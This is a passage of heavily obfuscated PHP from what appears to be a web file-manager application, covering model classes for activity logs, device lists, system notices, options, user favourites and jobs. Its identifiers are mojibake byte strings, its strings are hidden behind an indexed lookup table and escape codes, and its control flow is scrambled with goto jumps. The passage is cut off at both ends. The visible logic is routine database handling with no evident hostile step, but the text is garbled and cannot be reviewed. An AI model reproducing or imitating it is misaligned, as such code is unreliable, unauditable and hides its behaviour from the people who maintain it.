&$bğÀÆğÌ¹) { $a¾‡öÔÄ† =& $_SERVER[›èö’ù¤]; if (!isset($cöµáÌ­ª[$a¾‡öÔÄ†[2125]])) { return; } $c·ƒÍˆÆË = json_decode($cöµáÌ­ª[$a¾‡öÔÄ†[2125]], !0); foreach ($c·ƒÍˆÆË as $fİ¥©Æ¬„ƒ) { try { $CÃ‹Ï¿‚—ö = IO::infoFull($fİ¥©Æ¬„ƒ[$a¾‡öÔÄ†[76]]); } catch (Exception $eù¥äâÄ) { continue; } $cöµáÌ­ª[$a¾‡öÔÄ†[76]] = $fİ¥©Æ¬„ƒ[$a¾‡öÔÄ†[76]]; $bğÀÆğÌ¹[] = $cöµáÌ­ª[$a¾‡öÔÄ†[397]] = $CÃ‹Ï¿‚—ö[$a¾‡öÔÄ†[397]]; $bğÀÆğÌ¹[] = $cöµáÌ­ª[$a¾‡öÔÄ†[1937]] = $CÃ‹Ï¿‚—ö[$a¾‡öÔÄ†[493]]; break; } return $cöµáÌ­ª; } private function getSourceList(&$A˜óŒËÃ‚) { $D°Å«·º‘¾ =& $_SERVER[›èö’ù¤]; $EŸ½ƒ½ ˆ’ = array(); foreach ($A˜óŒËÃ‚ as $Aï¦ÔÇ°É– => $A¨¯ªË‘ì) { goto a‘ˆ¤ŸßÇå; EçßËéœĞõ: if ($b‹çáÂÆ¯[$D°Å«·º‘¾[29]] == $D°Å«·º‘¾[1945]) { $EŸ½ƒ½ ˆ’[] = $b‹çáÂÆ¯[$D°Å«·º‘¾[446]][$D°Å«·º‘¾[397]]; } goto c»š¡Îğ¢; a‘ˆ¤ŸßÇå: $b‹çáÂÆ¯ = json_decode($A¨¯ªË‘ì[$D°Å«·º‘¾[446]], !0); if ($A¨¯ªË‘ì[$D°Å«·º‘¾[29]] == $D°Å«·º‘¾[1691]) { $b‹çáÂÆ¯ = $this->descZipDownload($b‹çáÂÆ¯, $EŸ½ƒ½ ˆ’); $A˜óŒËÃ‚[$Aï¦ÔÇ°É–][$D°Å«·º‘¾[446]] = json_encode($b‹çáÂÆ¯); continue; } if (strpos($A¨¯ªË‘ì[$D°Å«·º‘¾[29]], $D°Å«·º‘¾[1938]) !== 0) { if (!isset($b‹çáÂÆ¯[$D°Å«·º‘¾[76]]) || strpos($A¨¯ªË‘ì[$D°Å«·º‘¾[29]], $D°Å«·º‘¾[2126]) !== 0) { continue; } try { $Dœ¤ù¿¬Ú = IO::infoFull($b‹çáÂÆ¯[$D°Å«·º‘¾[76]]); } catch (Exception $cˆè„èŠò) { continue; } $EŸ½ƒ½ ˆ’[] = $b‹çáÂÆ¯[$D°Å«·º‘¾[397]] = $Dœ¤ù¿¬Ú[$D°Å«·º‘¾[397]]; $EŸ½ƒ½ ˆ’[] = $b‹çáÂÆ¯[$D°Å«·º‘¾[1937]] = $Dœ¤ù¿¬Ú[$D°Å«·º‘¾[493]]; $A˜óŒËÃ‚[$Aï¦ÔÇ°É–][$D°Å«·º‘¾[446]] = json_encode($b‹çáÂÆ¯); continue; } goto Fô¾ŒÇîê¿; Fô¾ŒÇîê¿: $EŸ½ƒ½ ˆ’[] = $b‹çáÂÆ¯[$D°Å«·º‘¾[397]]; $EŸ½ƒ½ ˆ’[] = $b‹çáÂÆ¯[$D°Å«·º‘¾[1937]]; if ($b‹çáÂÆ¯[$D°Å«·º‘¾[29]] == $D°Å«·º‘¾[546]) { $EŸ½ƒ½ ˆ’[] = $b‹çáÂÆ¯[$D°Å«·º‘¾[446]][$D°Å«·º‘¾[1079]]; $EŸ½ƒ½ ˆ’[] = $b‹çáÂÆ¯[$D°Å«·º‘¾[446]][$D°Å«·º‘¾[1080]]; } goto EçßËéœĞõ; c»š¡Îğ¢: } if (!$EŸ½ƒ½ ˆ’) { return array(); } return Model($D°Å«·º‘¾[816])->sourceListInfo($EŸ½ƒ½ ˆ’, !0); } private function logList($F‡É”Ñ×) { goto dÚ¼¶Ü; c¯«ÈÓÈ—: $b§–×ÈÏ…Ÿ = array(); foreach ($F‡É”Ñ× as $e½˜Üõ¡½— => $B×‡ô¥ÇÚÚ) { goto B‹µˆáºâğ; BÚãÄª¨è®: $B×‡ô¥ÇÚÚ[$F»ÈÉ×ªôä[28]] = isset($a†ç¥š·Í[$F»ÈÉ×ªôä[28]]) ? $a†ç¥š·Í[$F»ÈÉ×ªôä[28]] : LNG($F»ÈÉ×ªôä[2123]); $B×‡ô¥ÇÚÚ[$F»ÈÉ×ªôä[1986]] = isset($a†ç¥š·Í[$F»ÈÉ×ªôä[1986]]) ? $a†ç¥š·Í[$F»ÈÉ×ªôä[1986]] : $F»ÈÉ×ªôä[33]; $B×‡ô¥ÇÚÚ[$F»ÈÉ×ªôä[1454]] = isset($AÙ£ÈÓÆéÓ[$fŸİŠİ×†]) ? $AÙ£ÈÓÆéÓ[$fŸİŠİ×†] : $EÕ‡çÛ²Áˆ; goto B“ÃÌœÏÙ®; Bç’‡©•æ: $this->ipAddress($B×‡ô¥ÇÚÚ); if (strpos($fŸİŠİ×†, $F»ÈÉ×ªôä[1938]) === 0 || isset($d—³áğ‡¼[$F»ÈÉ×ªôä[1937]])) { goto FŒˆ‚‡öÏ¸; e»Ù¬Ş¸¤Œ: if ($d—³áğ‡¼[$F»ÈÉ×ªôä[29]] == $F»ÈÉ×ªôä[1945]) { $d—³áğ‡¼[$F»ÈÉ×ªôä[446]][$F»ÈÉ×ªôä[397]] = $B¯‡Š²ïëÕ[$d—³áğ‡¼[$F»ÈÉ×ªôä[446]][$F»ÈÉ×ªôä[397]]]; } if ($d—³áğ‡¼[$F»ÈÉ×ªôä[29]] == $F»ÈÉ×ªôä[1686]) { $d—³áğ‡¼[$F»ÈÉ×ªôä[1950]] = $d—³áğ‡¼[$F»ÈÉ×ªôä[85]]; $d—³áğ‡¼[$F»ÈÉ×ªôä[1937]] = $d—³áğ‡¼[$F»ÈÉ×ªôä[1950]][$F»ÈÉ×ªôä[397]]; $d—³áğ‡¼[$F»ÈÉ×ªôä[85]] = !1; $d—³áğ‡¼[$F»ÈÉ×ªôä[397]] = $F»ÈÉ×ªôä[33]; } if ($d—³áğ‡¼[$F»ÈÉ×ªôä[85]] && $d—³áğ‡¼[$F»ÈÉ×ªôä[85]][$F»ÈÉ×ªôä[406]] == $F»ÈÉ×ªôä[1195]) { $b§–×ÈÏ…Ÿ[] = $B×‡ô¥ÇÚÚ[$F»ÈÉ×ªôä[395]]; unset($F‡É”Ñ×[$e½˜Üõ¡½—]); continue; } goto aÎœøÛÏ; aÎœøÛÏ: if ($d—³áğ‡¼[$F»ÈÉ×ªôä[1950]] && $d—³áğ‡¼[$F»ÈÉ×ªôä[1950]][$F»ÈÉ×ªôä[406]] == $F»ÈÉ×ªôä[1195]) { $b§–×ÈÏ…Ÿ[] = $B×‡ô¥ÇÚÚ[$F»ÈÉ×ªôä[395]]; unset($F‡É”Ñ×[$e½˜Üõ¡½—]); continue; } goto cÄÑ©¸´°Á; FŒˆ‚‡öÏ¸: $d—³áğ‡¼[$F»ÈÉ×ªôä[85]] = $B¯‡Š²ïëÕ[$d—³áğ‡¼[$F»ÈÉ×ªôä[397]]]; $d—³áğ‡¼[$F»ÈÉ×ªôä[1950]] = $B¯‡Š²ïëÕ[$d—³áğ‡¼[$F»ÈÉ×ªôä[1937]]]; if ($d—³áğ‡¼[$F»ÈÉ×ªôä[29]] == $F»ÈÉ×ªôä[546]) { $d—³áğ‡¼[$F»ÈÉ×ªôä[446]][$F»ÈÉ×ªôä[1079]] = $B¯‡Š²ïëÕ[$d—³áğ‡¼[$F»ÈÉ×ªôä[446]][$F»ÈÉ×ªôä[1079]]]; $d—³áğ‡¼[$F»ÈÉ×ªôä[446]][$F»ÈÉ×ªôä[1080]] = $B¯‡Š²ïëÕ[$d—³áğ‡¼[$F»ÈÉ×ªôä[446]][$F»ÈÉ×ªôä[1080]]]; } goto e»Ù¬Ş¸¤Œ; cÄÑ©¸´°Á: } $B×‡ô¥ÇÚÚ[$F»ÈÉ×ªôä[446]] = $d—³áğ‡¼; goto EïÄîÁ‰Ì¥; EïÄîÁ‰Ì¥: unset($B×‡ô¥ÇÚÚ[$F»ÈÉ×ªôä[2129]]); $AòáŞ“×Ã[] = $B×‡ô¥ÇÚÚ; goto aÑ§ÜÍƒ“é; B“ÃÌœÏÙ®: $B×‡ô¥ÇÚÚ[$F»ÈÉ×ªôä[1882]] = $a†ç¥š·Í; $d—³áğ‡¼ = json_decode($B×‡ô¥ÇÚÚ[$F»ÈÉ×ªôä[446]], !0); $B×‡ô¥ÇÚÚ[$F»ÈÉ×ªôä[2120]] = isset($d—³áğ‡¼[$F»ÈÉ×ªôä[2120]]) ? $d—³áğ‡¼[$F»ÈÉ×ªôä[2120]] : $F»ÈÉ×ªôä[33]; goto Bç’‡©•æ; B‹µˆáºâğ: $fŸİŠİ×† = $B×‡ô¥ÇÚÚ[$F»ÈÉ×ªôä[29]]; $a†ç¥š·Í = isset($F½’ƒù„Õ•[$B×‡ô¥ÇÚÚ[$F»ÈÉ×ªôä[1551]]]) ? $F½’ƒù„Õ•[$B×‡ô¥ÇÚÚ[$F»ÈÉ×ªôä[1551]]] : !1; $EÕ‡çÛ²Áˆ = strpos($fŸİŠİ×†, $F»ÈÉ×ªôä[2127]) === 0 ? LNG($F»ÈÉ×ªôä[2128]) : LNG($F»ÈÉ×ªôä[2123]); goto BÚãÄª¨è®; aÑ§ÜÍƒ“é: } $this->clearSystemPathLog($b§–×ÈÏ…Ÿ); goto A¸ïŒ¦Ë†; fÑÁŸ»Æã: $B¯‡Š²ïëÕ = $this->getSourceList($F‡É”Ñ×); $AÙ£ÈÓÆéÓ = $this->typeAll(); $AòáŞ“×Ã = array(); goto c¯«ÈÓÈ—; dÚ¼¶Ü: $F»ÈÉ×ªôä =& $_SERVER[›èö’ù¤]; $F×Ë¡õ¬£§ = array_to_keyvalue($F‡É”Ñ×, $F»ÈÉ×ªôä[33], $F»ÈÉ×ªôä[1551]); $F½’ƒù„Õ• = Model($F»ÈÉ×ªôä[533])->userListInfo(array_unique($F×Ë¡õ¬£§)); goto fÑÁŸ»Æã; A¸ïŒ¦Ë†: return $AòáŞ“×Ã; goto f³Š«ß…Õ¿; f³Š«ß…Õ¿: } private function clearSystemPathLog($Fº“’¤êï¥) { $f¹“ ¹¦éè =& $_SERVER[›èö’ù¤]; if (count($Fº“’¤êï¥) == 0) { return; } $Eã£àáŒ² = array($f¹“ ¹¦éè[395] => array($f¹“ ¹¦éè[7], array_unique($Fº“’¤êï¥))); $this->where($Eã£àáŒ²)->delete(); } public function deviceList($Aš²ØÔ©ËÌ, $e£—êƒÂ‹Š = 0) { $d‚ŒÄŠ¥† =& $_SERVER[›èö’ù¤]; $AÅ×Ê£¢œ© = array($d‚ŒÄŠ¥†[1551] => $Aš²ØÔ©ËÌ, $d‚ŒÄŠ¥†[194] => array($d‚ŒÄŠ¥†[997], $e£—êƒÂ‹Š), $d‚ŒÄŠ¥†[29] => $d‚ŒÄŠ¥†[1660]); $dŸÑ•º»É¥ = array(); $bìÁøïŒºÒ = $this->field($d‚ŒÄŠ¥†[2130])->where($AÅ×Ê£¢œ©)->order($d‚ŒÄŠ¥†[1948])->limit(50)->select(); foreach ($bìÁøïŒºÒ as $DßÕöÒÖ¯È => $Eò³š°Ø) { goto CÙØÔ‰ò»‰; cµÎÖø°¹«: unset($DŠ­ˆãõº…[$d‚ŒÄŠ¥†[2120]]); $EïÜÔ¿½øØ = $this->deviceType($DŠ­ˆãõº…[$d‚ŒÄŠ¥†[1939]]); if (isset($dŸÑ•º»É¥[$EïÜÔ¿½øØ])) { continue; } goto Dòöä×ê±; CÙØÔ‰ò»‰: if ($DßÕöÒÖ¯È > 0 && abs($Eò³š°Ø[$d‚ŒÄŠ¥†[194]] - $bìÁøïŒºÒ[$DßÕöÒÖ¯È - 1][$d‚ŒÄŠ¥†[194]]) < 5) { continue; } $DŠ­ˆãõº… = json_decode($Eò³š°Ø[$d‚ŒÄŠ¥†[446]], !0); $Eò³š°Ø[$d‚ŒÄŠ¥†[2120]] = isset($DŠ­ˆãõº…[$d‚ŒÄŠ¥†[2120]]) ? $DŠ­ˆãõº…[$d‚ŒÄŠ¥†[2120]] : $d‚ŒÄŠ¥†[33]; goto cµÎÖø°¹«; Dòöä×ê±: $this->ipAddress($Eò³š°Ø); $Eò³š°Ø[$d‚ŒÄŠ¥†[446]] = $DŠ­ˆãõº…; $dŸÑ•º»É¥[$EïÜÔ¿½øØ] = $Eò³š°Ø; goto Bé¾­ò™‰; Bé¾­ò™‰: } return array_values($dŸÑ•º»É¥); } public function deviceType($cÑ®Ÿ”ºÓ‰) { return $cÑ®Ÿ”ºÓ‰; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\56\x6e\157\164\x69\143\x65\114\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\143\x6f\156\x74\145\156\164", "\141\x75\x74\x68", "\155\157\x64\x65", "\164\151\155\x65", "\x74\171\160\x65", "\x6c\145\166\145\x6c", "\x65\156\141\142\x6c\145", "\x73\x6f\x72\x74"); public function listData($DŸÆùÃ„Ô = false, $dƒÆ±­ƒ²è = "\163\157\162\x74", $EÇÀ÷¶¤¨ = false) { return parent::listData($DŸÆùÃ„Ô, $dƒÆ±­ƒ²è, $EÇÀ÷¶¤¨); } public function add($cÂÆóç´ˆ) { $aå­Æ«šöé =& $_SERVER[›èö’ù¤]; $cË”„Îˆø = time(); if ($cÂÆóç´ˆ[$aå­Æ«šöé[12]] == $aå­Æ«šöé[2131]) { $cË”„Îˆø = strtotime($cÂÆóç´ˆ[$aå­Æ«šöé[197]]); } $cÂÆóç´ˆ[$aå­Æ«šöé[197]] = $cË”„Îˆø; return parent::insert($cÂÆóç´ˆ); } public function update($CÙù¢™”¾Î, $C•×ÀÌ¯ğÜ) { goto F±ø¤˜‘¹‡; B‚ŒÊÄáÓÍ: $dÔŸÛº“Ú = time(); if ($C•×ÀÌ¯ğÜ[$c¿õ«’Ü–¤[12]] == $c¿õ«’Ü–¤[2131]) { $dÔŸÛº“Ú = strtotime($C•×ÀÌ¯ğÜ[$c¿õ«’Ü–¤[197]]); } $C•×ÀÌ¯ğÜ[$c¿õ«’Ü–¤[197]] = $dÔŸÛº“Ú; goto DñµÆåˆÍ‰; F±ø¤˜‘¹‡: $c¿õ«’Ü–¤ =& $_SERVER[›èö’ù¤]; $Dİ‹¯Î¿ = $this->listData($CÙù¢™”¾Î); if (!$Dİ‹¯Î¿) { return !1; } goto B‚ŒÊÄáÓÍ; DñµÆåˆÍ‰: return parent::update($CÙù¢™”¾Î, $C•×ÀÌ¯ğÜ); goto c‡ñ™Û•Œİ; c‡ñ™Û•Œİ: } public function remove($AŸˆÍ­¶Š‘) { $BÛ¿ˆƒáê• = $this->listData($AŸˆÍ­¶Š‘); if (!$BÛ¿ˆƒáê• || $BÛ¿ˆƒáê•[$_SERVER[›èö’ù¤][1195]]) { return !1; } return parent::remove($AŸˆÍ­¶Š‘); } public function sort($BßŠéäôÉÃ, $d‡¤Ä»¨ĞÂ) { return parent::update($BßŠéäôÉÃ, $d‡¤Ä»¨ĞÂ); } public function enable($FÔ‰…ÄîÀ, $eÆÊí¬›Ğ) { return parent::update($FÔ‰…ÄîÀ, array($_SERVER[›èö’ù¤][2132] => $eÆÊí¬›Ğ)); } private function initUserOption() { $B™£á°¶˜ =& $_SERVER[›èö’ù¤]; $this->optionType = $B™£á°¶˜[2133]; $this->modelType = $B™£á°¶˜[2134]; $this->field = array($B™£á°¶˜[2135], $B™£á°¶˜[28], $B™£á°¶˜[197], $B™£á°¶˜[29], $B™£á°¶˜[2136], $B™£á°¶˜[734], $B™£á°¶˜[189]); } public function userNoticeGet($aªÚö»ßĞ¡ = false) { $this->initUserOption(); return parent::listData($aªÚö»ßĞ¡, $_SERVER[›èö’ù¤][395], !0); } public function userNoticeAdd($Fì¿Š¤ø×ª) { $cÖÚ‚‡Ä” =& $_SERVER[›èö’ù¤]; $this->initUserOption(); $cï¾º•íƒ = $this->findByKey($cÖÚ‚‡Ä”[2135], $Fì¿Š¤ø×ª[$cÖÚ‚‡Ä”[395]]); if ($cï¾º•íƒ) { return !0; } $fˆ±µê…’Á = array($cÖÚ‚‡Ä”[2135] => $Fì¿Š¤ø×ª[$cÖÚ‚‡Ä”[395]], $cÖÚ‚‡Ä”[28] => $Fì¿Š¤ø×ª[$cÖÚ‚‡Ä”[28]], $cÖÚ‚‡Ä”[197] => $Fì¿Š¤ø×ª[$cÖÚ‚‡Ä”[197]], $cÖÚ‚‡Ä”[29] => isset($Fì¿Š¤ø×ª[$cÖÚ‚‡Ä”[29]]) ? $Fì¿Š¤ø×ª[$cÖÚ‚‡Ä”[29]] : 1, $cÖÚ‚‡Ä”[2136] => isset($Fì¿Š¤ø×ª[$cÖÚ‚‡Ä”[2136]]) ? $Fì¿Š¤ø×ª[$cÖÚ‚‡Ä”[2136]] : 0, $cÖÚ‚‡Ä”[734] => 0, $cÖÚ‚‡Ä”[189] => 0); return parent::insert($fˆ±µê…’Á); } public function userNoticeEdit($e©ğğÕÊË, $A¯ÜÛÎ„ Ë) { $this->initUserOption(); return parent::update($e©ğğÕÊË, $A¯ÜÛÎ„ Ë); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\164\x65\155\137\157\160\x74\151\157\x6e"; protected $jsonField = array("\x6d\x65\x6e\x75", "\162\157\154\145", "\162\x6f\x6c\145\x47\162\157\165\160", "\x72\145\147\x69\x73\164", "\x65\155\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($FÉ±ß…¬¾¯) { return "\123\171\163\164\x65\x6d\x4f\x70\164\x69\x6f\156\x5f{$FÉ±ß…¬¾¯}"; } protected function optionDefault($bÅíéŸ«ç¨ = '') { $A£¢àÉ½” =& $_SERVER[›èö’ù¤]; if ($bÅíéŸ«ç¨ == $A£¢àÉ½”[33]) { return $GLOBALS[$A£¢àÉ½”[6]][$A£¢àÉ½”[379]]; } } } goto AÊ«Ä…²öµ; f†’Æ”²Ëª: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\146\141\x76"; protected function cacheFunctionAlias($B‘Œµ…¬‡À) { $b´Ëé¡©œ =& $_SERVER[›èö’ù¤]; return array($b´Ëé¡©œ[1827] => array(USER_ID, $b´Ëé¡©œ[2143])); } protected function listData() { $f±Š×è¡†à =& $_SERVER[›èö’ù¤]; $FñÌëÆ”§­ = array($f±Š×è¡†à[1542] => USER_ID, $f±Š×è¡†à[478] => 0); $fÚ¸Úê“é = $f±Š×è¡†à[2144]; $FÃğòƒÕÅğ = $this->field($fÚ¸Úê“é)->where($FñÌëÆ”§­)->order($f±Š×è¡†à[2145])->select(); return $FÃğòƒÕÅğ ? $FÃğòƒÕÅğ : array(); } protected function resetCache() { } protected function listView() { goto C¤¥ÜÔÕÅ©; b´É¬£×Š: $Aª¿³¬œØÁ = array_to_keyvalue($Aª¿³¬œØÁ, $DÁáÔÍÂÎÈ[397]); foreach ($BÖÑµŠŒ¨í as $f‰Ú…¨¸Ğ¾ => $E¥Õ¢¾ó“) { $F‹¹áÄ£ê÷ = $Aª¿³¬œØÁ[$E¥Õ¢¾ó“[$DÁáÔÍÂÎÈ[76]]]; $F‹¹áÄ£ê÷ = $F‹¹áÄ£ê÷ ? $F‹¹áÄ£ê÷ : array(); $BÖÑµŠŒ¨í[$f‰Ú…¨¸Ğ¾] = array_merge($F‹¹áÄ£ê÷, $E¥Õ¢¾ó“); } return $BÖÑµŠŒ¨í; goto aˆ«éÕÍƒ‘; C¤¥ÜÔÕÅ©: $DÁáÔÍÂÎÈ =& $_SERVER[›èö’ù¤]; $BÖÑµŠŒ¨í = $this->listData(); $C‡Ÿäçº· = array_filter_by_field($BÖÑµŠŒ¨í, $DÁáÔÍÂÎÈ[29], $DÁáÔÍÂÎÈ[411]); goto aÆ™ª™›©; cß¥èˆÑô®: $CÓÏçñ…¥¦ = array($DÁáÔÍÂÎÈ[412] => array($DÁáÔÍÂÎÈ[413], $fñŠ¼à’¥Ÿ)); $Aª¿³¬œØÁ = Model($DÁáÔÍÂÎÈ[816])->listSource($CÓÏçñ…¥¦, $cŒæ’Æˆ–Ë); $Aª¿³¬œØÁ = array_merge($Aª¿³¬œØÁ[$DÁáÔÍÂÎÈ[74]], $Aª¿³¬œØÁ[$DÁáÔÍÂÎÈ[75]]); goto b´É¬£×Š; aÆ™ª™›©: $fñŠ¼à’¥Ÿ = array_to_keyvalue($C‡Ÿäçº·, $DÁáÔÍÂÎÈ[33], $DÁáÔÍÂÎÈ[76]); if (!$fñŠ¼à’¥Ÿ) { return $BÖÑµŠŒ¨í; } $cŒæ’Æˆ–Ë = 2000; goto cß¥èˆÑô®; aˆ«éÕÍƒ‘: } protected function addFav($Dòƒ‹·¤—†, $EÃÅÛ˜·° = '', $f²¢Ìò„†ê = "\x73\x6f\x75\x72\143\145") { goto EãÑ©î¿‡; EÈí›Øªˆ: if (!$EÃÅÛ˜·° && $f²¢Ìò„†ê == $AŞœ£Šá×[411]) { $BØŠÙÈÌ¯ = Model($AŞœ£Šá×[1230])->where(array($AŞœ£Šá×[412] => $Dòƒ‹·¤—†))->find(); if (!$BØŠÙÈÌ¯) { return !1; } $EÃÅÛ˜·° = $BØŠÙÈÌ¯[$AŞœ£Šá×[28]]; } $EÃÅÛ˜·° = $this->getAutoName($EÃÅÛ˜·°); $EÓ¾©’”º¶ = array($AŞœ£Šá×[1542] => USER_ID, $AŞœ£Šá×[478] => 0, $AŞœ£Šá×[415] => $EÃÅÛ˜·°, $AŞœ£Šá×[416] => $Dòƒ‹·¤—†, $AŞœ£Šá×[417] => $f²¢Ìò„†ê, $AŞœ£Šá×[1724] => $Dº¸î¯ö‹ + 1); goto c¦¿Ğõà¤º; EãÑ©î¿‡: $AŞœ£Šá× =& $_SERVER[›èö’ù¤]; $C‹Ìµì—£‰ = array($AŞœ£Šá×[1542] => USER_ID, $AŞœ£Šá×[478] => 0, $AŞœ£Šá×[417] => $f²¢Ìò„†ê, $AŞœ£Šá×[416] => $Dòƒ‹·¤—†); if ($this->where($C‹Ìµì—£‰)->find()) { return !1; } goto B¦Ãª‘†â; c¦¿Ğõà¤º: return $this->add($EÓ¾©’”º¶); goto eø¶ÏŒÔ×; B¦Ãª‘†â: $C‹Ìµì—£‰ = array($AŞœ£Šá×[1542] => USER_ID, $AŞœ£Šá×[478] => 0); $Dº¸î¯ö‹ = $this->where($C‹Ìµì—£‰)->max($AŞœ£Šá×[1743]); if (!$Dº¸î¯ö‹) { $Dº¸î¯ö‹ = 0; } goto EÈí›Øªˆ; eø¶ÏŒÔ×: } protected function remove($CÃ¨Ş„) { $BÍÑÍÊÙ·² =& $_SERVER[›èö’ù¤]; $e¶îß˜‰Óº = array($BÍÑÍÊÙ·²[1542] => USER_ID, $BÍÑÍÊÙ·²[414] => $CÃ¨Ş„); return $this->where($e¶îß˜‰Óº)->delete(); } protected function removeByName($AÃ°ô¸×¶õ) { $dÑ…ğ¨ˆÃî =& $_SERVER[›èö’ù¤]; $cêÒó÷‰³É = array($dÑ…ğ¨ˆÃî[1542] => USER_ID, $dÑ…ğ¨ˆÃî[415] => $AÃ°ô¸×¶õ, $dÑ…ğ¨ˆÃî[478] => 0); return $this->where($cêÒó÷‰³É)->delete(); } protected function rename($eÒ•—Ğ©˜™, $eÓÈ‡â¾©¿) { $D¾ëÛŒàÃ =& $_SERVER[›èö’ù¤]; if ($eÒ•—Ğ©˜™ == $eÓÈ‡â¾©¿) { return !1; } $dÚ‰Ú‘×İŞ = $this->getAutoName($eÓÈ‡â¾©¿); if ($eÓÈ‡â¾©¿ != $dÚ‰Ú‘×İŞ) { return !1; } $E‚„õÃÜ× = array($D¾ëÛŒàÃ[1542] => USER_ID, $D¾ëÛŒàÃ[478] => 0, $D¾ëÛŒàÃ[28] => $eÒ•—Ğ©˜™); return $this->where($E‚„õÃÜ×)->save(array($D¾ëÛŒàÃ[28] => $eÓÈ‡â¾©¿)); } protected function resetSort($c¥ÆØöó©¥) { $BÜ…Õô =& $_SERVER[›èö’ù¤]; $c¥ÆØöó©¥ = is_array($c¥ÆØöó©¥) ? $c¥ÆØöó©¥ : array(); $EƒÆÎîì½ = array($BÜ…Õô[1542] => USER_ID); for ($d‡„ª­Œ¯Œ = 0; $d‡„ª­Œ¯Œ < count($c¥ÆØöó©¥); $d‡„ª­Œ¯Œ++) { $EƒÆÎîì½[$BÜ…Õô[414]] = $c¥ÆØöó©¥[$d‡„ª­Œ¯Œ]; $this->where($EƒÆÎîì½)->save(array($BÜ…Õô[1724] => $d‡„ª­Œ¯Œ + 1)); } return !0; } protected function moveTop($Eäƒ¤¼õ…¢) { goto Cßª¾¼ë‘; cÂïÍòç¬š: return $this->resetSort($aíÂÉ¹Òˆ); goto DÒ¡¼¥Ü†; B¦¤¿‘‡…: if (!$F‹†­œ´ØÁ) { return; } $aíÂÉ¹Òˆ = $this->field($fù¤ÖÛ·¥[395])->where($Aô‚Û¥ ´ê)->order($fù¤ÖÛ·¥[2145])->select(); $aíÂÉ¹Òˆ = array_to_keyvalue($aíÂÉ¹Òˆ, $fù¤ÖÛ·¥[33], $fù¤ÖÛ·¥[395]); goto DÙ¶ĞÒ÷É; Cßª¾¼ë‘: $fù¤ÖÛ·¥ =& $_SERVER[›èö’ù¤]; $Aô‚Û¥ ´ê = array($fù¤ÖÛ·¥[1542] => USER_ID, $fù¤ÖÛ·¥[478] => 0); $F‹†­œ´ØÁ = $this->where($Aô‚Û¥ ´ê)->where(array($fù¤ÖÛ·¥[28] => $Eäƒ¤¼õ…¢))->find(); goto B¦¤¿‘‡…; DÙ¶ĞÒ÷É: $A¬æÍŠ = $aíÂÉ¹Òˆ; $aíÂÉ¹Òˆ = array_remove_value($aíÂÉ¹Òˆ, $F‹†­œ´ØÁ[$fù¤ÖÛ·¥[395]]); array_unshift($aíÂÉ¹Òˆ, $F‹†­œ´ØÁ[$fù¤ÖÛ·¥[395]]); goto cÂïÍòç¬š; DÒ¡¼¥Ü†: } protected function moveBottom($Eâ³Û¢¸—Ü) { $B¥âÅˆÏà£ =& $_SERVER[›èö’ù¤]; $e§ß„âÀ†Š = array($B¥âÅˆÏà£[1542] => USER_ID, $B¥âÅˆÏà£[478] => 0); $Aô÷Õ©Ùë = $this->where($e§ß„âÀ†Š)->max($B¥âÅˆÏà£[1743]); $c§ÁÜ£¢©± = array($B¥âÅˆÏà£[1743] => $Aô÷Õ©Ùë + 1); return $this->where($e§ß„âÀ†Š)->where(array($B¥âÅˆÏà£[28] => $Eâ³Û¢¸—Ü))->save($c§ÁÜ£¢©±); } private function getAutoName($e¨ÛÕéÅĞÖ) { goto aÍëÇî·íê; EğàñÎ›ºµ: $a³¦Øï—…« = array_to_keyvalue($a³¦Øï—…«, $BÜ§¦é‰¹ç[33], $BÜ§¦é‰¹ç[28]); if (!$a³¦Øï—…« || !in_array($e¨ÛÕéÅĞÖ, $a³¦Øï—…«)) { return $e¨ÛÕéÅĞÖ; } for ($B‡‹Â³Ù¥§ = 0; $B‡‹Â³Ù¥§ < count($a³¦Øï—…«); $B‡‹Â³Ù¥§++) { if (!in_array($e¨ÛÕéÅĞÖ . "\x28{$B‡‹Â³Ù¥§}\51", $a³¦Øï—…«)) { return $e¨ÛÕéÅĞÖ . "\x28{$B‡‹Â³Ù¥§}\x29"; } } goto eéçİïÑ •; eéçİïÑ •: return $e¨ÛÕéÅĞÖ . "\x28{$B‡‹Â³Ù¥§}\x29"; goto d¯§’µÙØÖ; aÍëÇî·íê: $BÜ§¦é‰¹ç =& $_SERVER[›èö’ù¤]; $c¢º­¹“á = array($BÜ§¦é‰¹ç[1542] => USER_ID, $BÜ§¦é‰¹ç[478] => 0); $a³¦Øï—…« = $this->field($BÜ§¦é‰¹ç[28])->where($c¢º­¹“á)->select(); goto EğàñÎ›ºµ; d¯§’µÙØÖ: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\x6a\x6f\x62\x4c\x69\x73\x74"; public $field = array("\x6e\141\155\x65", "\x64\x65\x73\143", "\163\x6f\x72\164"); const JOB_KEY = "\163\x65\154\146\x4a\x6f\x62\114\151\163\x74"; public function listData($côøºˆ«ˆŒ = false, $eßÉóÎî“’ = "\163\x6f\x72\x74", $D•“š¦©‰· = false) { return parent::listData($côøºˆ«ˆŒ, $eßÉóÎî“’, $D•“š¦©‰·); } public function remove($d›¨Îˆùõâ) { return parent::remove($d›¨Îˆùõâ); } public function add($eÚ¾Åø‰åã) { $aÄˆÓææÌ =& $_SERVER[›èö’ù¤]; if ($this->findByName($eÚ¾Åø‰åã[$aÄˆÓææÌ[28]])) { return !1; } $eÚ¾Åø‰åã[$aÄˆÓææÌ[1743]] = $this->getSort(); return parent::insert($eÚ¾Åø‰åã); } private function getSort() { $a¤Ş²»ò¢ =& $_SERVER[›èö’ù¤]; $BÈ„ˆ¿ÜäÖ = parent::listData(); $aËÛ¡ª‘ÄÜ = array_to_keyvalue($BÈ„ˆ¿ÜäÖ, $a¤Ş²»ò¢[33], $a¤Ş²»ò¢[1743]); return empty($aËÛ¡ª‘ÄÜ) ? 0 : max($aËÛ¡ª‘ÄÜ) + 1; } public function update($d¶ƒ°›¡ö, $BÆ®ã·ÈÄ) { $EÍÌ£ÍÑ¿ =& $_SERVER[›èö’ù¤]; $dÀ›†–ªäõ = parent::listData($d¶ƒ°›¡ö); $AÓäİ¤àí® = $this->findByName($BÆ®ã·ÈÄ[$EÍÌ£ÍÑ¿[28]]); if (!$dÀ›†–ªäõ || $AÓäİ¤àí® && $AÓäİ¤àí®[$EÍÌ£ÍÑ¿[395]] != 